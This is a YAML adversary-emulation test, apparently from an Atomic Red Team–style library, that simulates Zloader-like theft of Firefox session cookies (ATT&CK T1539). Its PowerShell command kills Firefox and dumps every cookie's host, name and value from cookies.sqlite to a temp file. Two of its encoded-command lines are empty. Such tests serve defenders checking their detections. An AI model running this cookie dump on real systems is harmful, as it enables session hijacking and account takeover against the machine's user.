- id: 73806b06-dd70-5b17-8732-5da4909922eb
  name: Soumaia ART Tests - Steal Firefox Cookies (Windows)
  description: "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf."
  tactic: credential-access
  technique:
    attack_id: T1539
    name: Steal Web Session Cookie
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          stop-process -name "firefox" -force -erroraction silentlycontinue
          $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
          "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c $env:TEMP\ART-ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe "$CookieDBLocation" | out-file -filepath "$env:TEMP\ART-ExternalPayloads\T1539FirefoxCookies.txt"
        cleanup: |-
          remove-item $env:TEMP\ART-ExternalPayloads\T1539FirefoxCookies.txt -erroraction silentlycontinue
